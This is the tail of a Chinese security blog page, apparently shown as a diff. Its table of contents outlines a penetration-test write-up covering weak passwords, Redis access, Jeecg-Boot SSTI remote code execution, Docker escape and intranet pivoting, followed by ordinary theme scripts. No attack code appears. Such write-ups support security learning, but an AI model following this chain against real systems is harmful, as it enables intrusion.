+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">外网信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-text">外网漏洞探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-text">MySQL弱口令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Redis未授权访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E7%B3%BB%E7%BB%9F"><span class="toc-text">Web 系统</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">外网漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL-RCE-%E5%A4%B1%E8%B4%A5"><span class="toc-text">MySQL RCE(失败)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Redis-RCE-%E5%A4%B1%E8%B4%A5"><span class="toc-text">Redis  RCE(失败)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DocToolkit-%E7%B3%BB%E7%BB%9F-RCE-%E5%A4%B1%E8%B4%A5"><span class="toc-text">DocToolkit 系统 RCE(失败)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-text">弱口令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Jeecg-Boot-%E7%B3%BB%E7%BB%9FRCE-%E6%88%90%E5%8A%9F"><span class="toc-text">Jeecg-Boot 系统RCE(成功)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#queryFieldBySql-SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-text">queryFieldBySql SSTI模板注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#loadTableData-SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-text">loadTableData SSTI模板注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DocToolkit-%E7%B3%BB%E7%BB%9FRCE-%E6%88%90%E5%8A%9F"><span class="toc-text">DocToolkit 系统RCE(成功)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-%E9%80%83%E9%80%B8"><span class="toc-text">Docker 逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%B1%82%E5%86%85%E7%BD%91"><span class="toc-text">第一层内网</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">任意文件上传</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91"><span class="toc-text">第二层内网</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
